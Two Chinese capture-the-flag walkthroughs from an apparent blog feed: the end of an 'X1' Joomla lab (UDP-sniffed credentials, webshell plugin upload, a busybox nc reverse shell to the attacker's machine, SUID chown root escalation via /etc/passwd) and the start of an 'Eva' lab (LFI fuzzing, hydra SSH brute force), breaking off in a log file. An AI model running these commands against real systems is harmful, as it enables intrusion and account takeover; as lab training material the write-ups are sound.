是 Joomla，版本 5.3.0。查了一下，这版本3月份才发布的第三版，真够新鲜的（流鼻涕）。这意味着公开的 Exploit 估计是没戏了，除非咱能现场打个0day，那当我没说。

还是老老实实找信息吧。

#### 4. 目录爆破，看看藏了啥

用 `gobuster` 跑一下目录：

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://192.168.205.207/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html
# ... (扫描过程和部分结果) ...
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.207/images/]
/index.php            (Status: 200) [Size: 9102]
/README.txt           (Status: 200) [Size: 5034]
/robots.txt           (Status: 200) [Size: 764]
/administrator        (Status: 301) [Size: 326] [--&gt; http://192.168.205.207/administrator/]
/configuration.php    (Status: 200) [Size: 0] 
/htaccess.txt         (Status: 200) [Size: 6899]
# ... (其他301重定向) ...
```

扫出来一堆301，有用的不多。

* `/index.php`：首页，忽略。

* `/README.txt`：没啥隐藏信息。

* `/robots.txt`：内容如下：

  ```
  User-agent: *
  Disallow: /administrator/
  Disallow: /api/
  Disallow: /bin/
  Disallow: /cache/
  Disallow: /cli/
  Disallow: /components/
  Disallow: /includes/
  Disallow: /installation/
  Disallow: /language/
  Disallow: /layouts/
  Disallow: /libraries/
  Disallow: /logs/
  Disallow: /modules/
  Disallow: /plugins/ 
  Disallow: /tmp/
  ```

  `/plugins/` 目录看着可疑，但访问了一下，不给看...

* `/htaccess.txt`：也没啥隐藏信息。

#### 5. Joomla专用扫描器 `joomscan` 登场

找了半天没啥进展，掏出了 Joomla 专用扫描器 `joomscan`：

```shell
┌──(kali㉿kali)-[~]
└─$ joomscan --url http://192.168.205.207/
# ... (扫描过程) ...
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 5.3.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.205.207/administrator/components
http://192.168.205.207/administrator/modules
http://192.168.205.207/administrator/templates
http://192.168.205.207/images/banners
# ... (其他发现) ...
```

`joomscan` 也没发现啥实质性的漏洞，就列了几个能访问的目录。我还以为能扒拉出个什么插件漏洞呢，结果这CMS比我钱包都干净。

#### 6. 难道不是80端口？排查其他可能性

**IPv6 瞅瞅：**

```shell
┌──(kali㉿kali)-[~]
└─$ ping6 -I eth0 ff02::1
# ... (ping6 正常，发现 fe80::a00:27ff:feaa:93a3%eth0) ...
└─$ nmap -6 -p- fe80::a00:27ff:feaa:93a3%eth0
# ... (扫描结果还是只有 22 和 80) ...
```

IPv6 这边没啥幺蛾子。

**UDP 端口扫一下常见的：**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sU --top-ports 100 192.168.205.207 
# ... (扫描结果) ...
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

常见的100个UDP端口也没啥发现（如果他端口开在100名开外，那对我可真是绝杀了）。

这下给我整怀疑人生了，去瞅了眼靶机难度：
![image-20250511215218183](https://7r1umphk.github.io/image/20250511215218301.webp)
'比较简单'？？？难道是我变菜了？？？

#### 7. 峰回路转，监听网络流量！

之前遇到过会定时发包的靶机，试试看有没有动静。
`tcpdump` 监听 ICMP：

```shell
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
# ... (一片寂静) ...
```

毛线没有，啊啊啊！TCP的包也看了一堆，除了我自己的流量，也没啥特别的（私人的包就不贴上来了）。

**最后希望，UDP流量：**

```shell
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n udp 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:57:33.971737 IP 192.168.205.207.48368 &gt; 255.255.255.255.5000: UDP, length 1
E.....@.@................       h.8.................
09:57:33.971797 IP 192.168.205.207.48368 &gt; 255.255.255.255.5000: UDP, length 1
E.....@.@................       h.8.................
# ... (持续出现类似的 UDP 包，目标端口 5000，长度为 1) ...
09:58:02.059998 IP 192.168.205.207.39435 &gt; 255.255.255.255.5000: UDP, length 1
E...+t@.@................       Q.r.................
# ... (数据内容在变化，但都是单个字符) ...
```

我去！在这儿等着我呢！目标主机 `192.168.205.207` 在往广播地址 `255.255.255.255` 的 UDP 5000 端口发包，每次一个字符。
这不就对上了吗？首页那个 'shark'（鲨鱼）... **Wireshark**！草，原来是这个意思！

赶紧把这些字符提取出来。一个个复制粘贴太蠢了，不理解但尊重想那么干的勇士。
仔细观察发现，它是在UDP 5000端口下发送数据。用 `nc` 试试：

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lu -p 5000
r^C 
```

等了一会儿，`nc` 只能接收一个字符，而且接收完就断了。这不行啊，得想个办法持续接收。我去问了GPT，它给了个用 `ncat` 的方法：

```shell
┌──(kali㉿kali)-[~]
└─$ ncat -luk -p 5000
8182602383ce1root:00dae9e3052fb2255408182602383ce1^C
```

成了！捕获到一串字符：`root:00dae9e3052fb2255408182602383ce1`

### 二、获取初始访问权限

按照我对群主的理解，就算靶机标的“比较简单”，也不会直接就送个 root 密码。这串 `root:00dae9e3052fb2255408182602383ce1` 看着就像用户名和密码（或者密码哈希），这应该是 Joomla 后台 `/administrator/` 的登录凭据。

#### 1. 登录Joomla后台

用用户名 `root` 和密码 `00dae9e3052fb2255408182602383ce1` 尝试登录 `http://192.168.205.207/administrator/`。

成功登录！我还以为要解个Hash呢。

#### 2. 上传Webshell插件

进了后台，这种CMS最常见的GetShell方式就是通过插件上传Webshell。

![image-20250511222523465](https://7r1umphk.github.io/image/20250511222523819.webp)在GitHub上搜了一下 'Joomla webshell plugin'，很快找到了一个现成的：
`https://github.com/p0dalirius/Joomla-webshell-plugin`

![image-20250511222613763](https://7r1umphk.github.io/image/20250511222613917.webp)

根据项目说明，在它的 `dist` 目录里下载一个打包好的 `mod_webshell.zip` 就行。

回到Joomla后台，'System' -&gt; 'Install' -&gt; 'Extensions'，上传并安装 `mod_webshell.zip`。
安装成功后，根据插件的说明文档，可以通过访问特定路径来执行命令。

![image-20250511222957053](https://7r1umphk.github.io/image/20250511222957204.webp)

测试一下命令执行：

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=id'
{'stdout':'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n','stderr':'','exec':'id'}
```

命令成功执行，当前用户是 `www-data`。

### 三、反弹Shell与提权

#### 1. 获取反弹Shell

先在Kali上监听端口：

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888    
listening on [any] 8888 ...
```

然后通过Webshell执行反弹命令：

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=nc 192.168.205.206 8888 -e /bin/bash'
{'stdout':'','stderr':'sh: 1: nc: not found\n','exec':'nc 192.168.205.206 8888 -e \/bin\/bash'}
```

目标机上没有 `nc`。试试 `busybox nc`：

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx]                                                                                                                                                     
└─$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&amp;cmd=busybox nc 192.168.205.206 8888 -e /bin/sh'
```

这次成功了！Kali的监听器收到了连接：

```shell
┌──(kali㉿kali)-[~]                                                                                                                                                                
└─$ nc -lvnp 8888                                                                                                                                                                  
listening on [any] 8888 ...                                                                                                                                                        
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.207] 39696
```

#### 2. 稳定Shell

得到的初始Shell不太好用，需要稳定一下：

```bash
# 在反弹回来的shell里执行
script /dev/null -c bash
# 按 Ctrl+Z 放到后台
# 在Kali终端执行
stty raw -echo; fg
# 回车，然后继续在反弹shell里执行
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80 # 根据自己终端调整
```

OK，现在有个像样的Shell了。

#### 3. 权限提升 (`www-data` -&gt; `root`)

当前用户 `www-data`：

```
www-data@X1:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

到处翻翻看，先看看 `/home` 和 `/var/www` 目录：

```shell
www-data@X1:/$ cd /home/
www-data@X1:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
drwxr-xr-x 19 root    root    4096 May 10 03:38 ..
drwx------  2 welcome welcome 4096 May 10 03:44 welcome
www-data@X1:/home$ cd /var/www/html
www-data@X1:/var/www/html$ ls -al 
# ... (Joomla 文件列表) ...
www-data@X1:/var/www/html$ cat web.config.txt 
&lt;?xml version='1.0' encoding='UTF-8'?&gt;
&lt;configuration&gt;
   &lt;location path='.'&gt;
   &lt;system.webServer&gt;
       &lt;directoryBrowse enabled='false' /&gt;
       &lt;rewrite&gt;
           &lt;rules&gt;
               &lt;rule name='Joomla! Common Exploits Prevention' stopProcessing='true'&gt;
                   &lt;match url='^(.*)$' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAny'&gt;
                       &lt;add input='{QUERY_STRING}' pattern='base64_encode[^(]*\([^)]*\)' ignoreCase='false' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='(&amp;gt;|%3C)([^s]*s)+cript.*(&amp;lt;|%3E)' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='GLOBALS(=|\[|\%[0-9A-Z]{0,2})' ignoreCase='false' /&gt;
                       &lt;add input='{QUERY_STRING}' pattern='_REQUEST(=|\[|\%[0-9A-Z]{0,2})' ignoreCase='false' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='CustomResponse' url='index.php' statusCode='403' statusReason='Forbidden' statusDescription='Forbidden' /&gt;
               &lt;/rule&gt;
               &lt;rule name='Joomla! API Application SEF URLs'&gt;
                   &lt;match url='^api/(.*)' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAll'&gt;
                     &lt;add input='{URL}' pattern='^/api/index.php' ignoreCase='true' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='Rewrite' url='api/index.php' /&gt;
               &lt;/rule&gt;
               &lt;rule name='Joomla! Public Frontend SEF URLs'&gt;
                   &lt;match url='(.*)' ignoreCase='false' /&gt;
                   &lt;conditions logicalGrouping='MatchAll'&gt;
                     &lt;add input='{URL}' pattern='^/index.php' ignoreCase='true' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' /&gt;
                     &lt;add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' /&gt;
                   &lt;/conditions&gt;
                   &lt;action type='Rewrite' url='index.php' /&gt;
               &lt;/rule&gt;
           &lt;/rules&gt;
       &lt;/rewrite&gt;
       &lt;httpProtocol&gt;
           &lt;customHeaders&gt;
               &lt;add name='X-Content-Type-Options' value='nosniff' /&gt;
               &lt;!-- Protect against certain cross-origin requests. More information can be found here: --&gt;
               &lt;!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_(CORP) --&gt;
               &lt;!-- https://web.dev/why-coop-coep/ --&gt;
               &lt;!-- &lt;add name='Cross-Origin-Resource-Policy' value='same-origin' /&gt; --&gt;
               &lt;!-- &lt;add name='Cross-Origin-Embedder-Policy' value='require-corp' /&gt; --&gt;
           &lt;/customHeaders&gt;
       &lt;/httpProtocol&gt;
   &lt;/system.webServer&gt;
   &lt;/location&gt;
&lt;/configuration&gt;
```

寻找SUID文件进行提权：

```shell
www-data@X1:/var/www/html$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chown  &lt;-- 老朋友了！
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

发现了 `/usr/bin/chown` 这个老朋友，并且有SUID权限。
查阅 GTFOBins ([https://gtfobins.github.io/gtfobins/chown/#suid](https://gtfobins.github.io/gtfobins/chown/#suid))：

![image-20250511223840468](https://7r1umphk.github.io/image/20250511223840670.webp)

思路就是用 `chown` 把 `/etc/passwd` 的所有权改成 `www-data`，然后我们就可以编辑它，给root用户改个密码（或者直接添加一个带root权限的新用户）。

**生成密码哈希：**
在Kali上用 `openssl` 生成一个密码 `888888` 的哈希：

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ openssl passwd 888888   
$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1
```

**开始操作：**
在 `www-data` 的Shell里：

1. 更改 `/etc/passwd` 的所有权：

   ```shell
   www-data@X1:/var/www/html/administrator$ chown www-data:www-data /etc/passwd
   ```

2. 编辑 `/etc/passwd` (如果目标机上有 `nano` 或 `vi` 就方便多了，没有的话就得想办法把内容弄出来改了再覆盖回去)：

   ```shell
   www-data@X1:/var/www/html/administrator$ nano /etc/passwd
   ```

   找到 `root` 用户那一行，通常是 `root:x:0:0:root:/root:/bin/bash`，把 `x` 替换成我们生成的哈希 `$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1`。
   修改后变成：`root:$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1:0:0:root:/root:/bin/bash`

   ![image-20250511224840653](https://7r1umphk.github.io/image/20250511224840863.webp)
   保存退出。

3. 切换到 `root` 用户：

   ```shell
   www-data@X1:/var/www/html/administrator$ su -
   Password:  # 输入 888888
   root@X1:~# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

   成功拿到 root 权限！

#### 4. 读取最终的 Flag

```shell
root@X1:~# cat /root/root.txt
flag{root-72c0cd908b77fd5a4d0c988f7e002431}    
```

搞定！

### 四、总结

这个 X1 靶机，前期信息收集阶段那个 UDP 80 端口的'鲨鱼'提示确实有点意思，没注意到的话估计得卡一会儿（我就是那个冤种）。拿到 Joomla 后台凭据后，上传插件 getshell 属于常规操作。最后的 `chown` SUID 提权也是比较经典的利用方式。整体来说，确实是“比较简单”，但过程还是挺有趣的。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:29:41 +0000</pubDate></item><item><title>内部_Eva</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Eva.html</link><description>![image-20250608102554020](https://7r1umphk.github.io/image/20250608102601444.webp)

打坤打坤

探测ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l                                      
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.130 08:00:27:9c:35:56       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.044 seconds (125.24 hosts/sec). 4 responded
                       
```

靶机ip 192.168.205.130，探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.130            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:27 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80 -sC -sV 192.168.205.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 22:28 EDT
Nmap scan report for 192.168.205.130
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: \xE2\x9D\x80 \xE9\xBE\x8D \xC2\xB7 \xE8\xA6\xBA\xE9\x86\x92 \xE2\x9D\x80
MAC Address: 08:00:27:9C:35:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds

```

常规，看web

![1](https://7r1umphk.github.io/image/20250608102947610.webp)

一个关于《龙族》的页面
扒拉了一下源代码，没有什么

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ dirsearch -u http://192.168.205.130/                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/reports/http_192.168.205.130/__25-06-07_22-30-53.txt

Target: http://192.168.205.130/

[22:30:53] Starting: 
[22:30:54] 403 -  280B  - /.ht_wsr.txt
[22:30:54] 403 -  280B  - /.htaccess.bak1
[22:30:54] 403 -  280B  - /.htaccess.orig
[22:30:54] 403 -  280B  - /.htaccess.sample
[22:30:54] 403 -  280B  - /.htaccess.save
[22:30:54] 403 -  280B  - /.htaccess_extra
[22:30:54] 403 -  280B  - /.htaccess_sc
[22:30:54] 403 -  280B  - /.htaccess_orig
[22:30:54] 403 -  280B  - /.htaccessBAK
[22:30:54] 403 -  280B  - /.htaccessOLD
[22:30:54] 403 -  280B  - /.htaccessOLD2
[22:30:54] 403 -  280B  - /.htm
[22:30:54] 403 -  280B  - /.html
[22:30:54] 403 -  280B  - /.htpasswd_test
[22:30:54] 403 -  280B  - /.htpasswds
[22:30:54] 403 -  280B  - /.httr-oauth
[22:30:54] 403 -  280B  - /.php
[22:31:14] 403 -  280B  - /server-status
[22:31:14] 403 -  280B  - /server-status/

Task Completed
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://192.168.205.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.130/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12224]
/dragon.php           (Status: 200) [Size: 10284]
Progress: 76819 / 1102800 (6.97%)
```

探测到一个/dragon.php，先看看
![image-20250608103236313](https://7r1umphk.github.io/image/20250608103236778.webp)

有四个言灵，扒拉一下源代码
源代码重点

```
&lt;div class='incantation-name' data-name='divinedecree'&gt;
                DivineDecree
                &lt;div class='tooltip'&gt;
                    &lt;div class='tooltip-title'&gt;DIVINE DECREE&lt;/div&gt;
                    &lt;div class='tooltip-desc'&gt;
                        The holy light that illuminates all truth. This ability allows access to all knowledge and secrets.&lt;br&gt;&lt;br&gt;
                        ⚠️ WARNING: DivineDecree can reveal and read ALL content without restrictions. Handle with extreme care!
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
```

'⚠️ 警告：DivineDecree 可以不受限制地显示和阅读所有内容。请格外小心！'

提示我们是一个LFI，然后它按钮确实是发包了

```
&lt;form method='post'&gt;
            &lt;input 
                type='text' 
                name='incantation' 
                id='incantation-input'
                class='incantation-input' 
                placeholder='Enter Incantation...' 
                autocomplete='off'
            &gt;
```

所以大概拼接一下incantation=DivineDecree

burp抓一下

```
POST /dragon.php HTTP/1.1
Host: 192.168.205.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://192.168.205.130
Connection: keep-alive
Referer: http://192.168.205.130/dragon.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

incantation=divinedecree
```

发包没有任何变化，但是它都提醒是LFI了所以FUZZ一下

两个方案

你可以拿burp intruder fuzz

或者拿wfuzz fuzz，我演示wfuzz

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd' -X POST -d 'incantation=divinedecree' --hh 10213
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.130/dragon.php?FUZZ=../../../etc/passwd
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000000759:   200        347 L    917 W      11711 Ch    'file'                                                                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1097
Filtered Requests: 1096
Requests/sec.: 0
```

curl一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wget http://192.168.205.130/dragon.php                                                                              
--2025-06-07 22:42:08--  http://192.168.205.130/dragon.php
Connecting to 192.168.205.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘dragon.php’

dragon.php                                       [ &lt;=&gt;                                                                                          ]  10.04K  --.-KB/s    in 0s      

2025-06-07 22:42:08 (370 MB/s) - ‘dragon.php’ saved [10284]

                     
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://192.168.205.130/dragon.php?file=../../../etc/passwd -X POST -d 'incantation=divinedecree' -o 1.php                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11893    0 11869  100    24  2658k   5504 --:--:-- --:--:-- --:--:-- 2903k
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ diff dragon.php 1.php                                               
229c229,258
&lt;                 
---
&gt;         root:x:0:0:root:/root:/bin/bash
&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
&gt; sync:x:4:65534:sync:/bin:/bin/sync
&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
&gt; Fingal:x:1000:1000::/home/Fingal:/bin/sh
&gt; lumingfei:x:1001:1001::/home/lumingfei:/usr/sbin/nologin
&gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
&gt;         
&gt;                     &lt;div class='effect divinedecree-effect' style='z-index: 5;'&gt;&lt;/div&gt;

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ diff dragon.php 1.php |grep 'bash'
&gt;         root:x:0:0:root:/root:/bin/bash
&gt; uesugierii:x:1002:1002:,,,:/home/uesugierii:/bin/bash
              
```

拿到一个uesugierii用户，看有没有ssh私钥

没有，拿去hydra吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l uesugierii -P 5000q.txt ssh://192.168.205.130 -I -u -f -e nsr -t 64                            
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-07 22:45:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.130:22/
[22][ssh] host: 192.168.205.130   login: uesugierii   password: sakura
[STATUS] attack finished for 192.168.205.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-07 22:45:36
                            
```

uesugierii:sakura，ssh登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh uesugierii@192.168.205.130
The authenticity of host '192.168.205.130 (192.168.205.130)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (1 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.130' (ED25519) to the list of known hosts.
uesugierii@192.168.205.130's password: 
Linux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
uesugierii@EVA:~$ id
uid=1002(uesugierii) gid=1002(uesugierii) groups=1002(uesugierii)
```

扒拉信息

```
uesugierii@EVA:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for uesugierii: 
Sorry, user uesugierii may not run sudo on EVA.
uesugierii@EVA:~$ ls -la
total 24
drwx------ 2 uesugierii uesugierii 4096 Jun  6 09:48 .
drwxr-xr-x 5 root       root       4096 Jun  6 09:43 ..
-rw-r--r-- 1 uesugierii uesugierii  220 Jun  6 09:43 .bash_logout
-rw-r--r-- 1 uesugierii uesugierii 3526 Jun  6 09:43 .bashrc
-rw------- 1 uesugierii uesugierii  840 Jun  6 09:48 eva.pinglog
-rw-r--r-- 1 uesugierii uesugierii  807 Jun  6 09:43 .profile
uesugierii@EVA:~$ cat eva.pinglog
ping
pong
ping
ping
ping
pong
pong
ping
ping
pong
pong
ping
pong
ping
ping
pong
ping
pong
pong
ping
pong
pong
pong
ping
ping
pong
pong
ping
ping
pong
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
ping
pong
pong
ping
pong
pong
ping
ping
ping
ping
pong
pong
pong
ping
pong
ping
ping
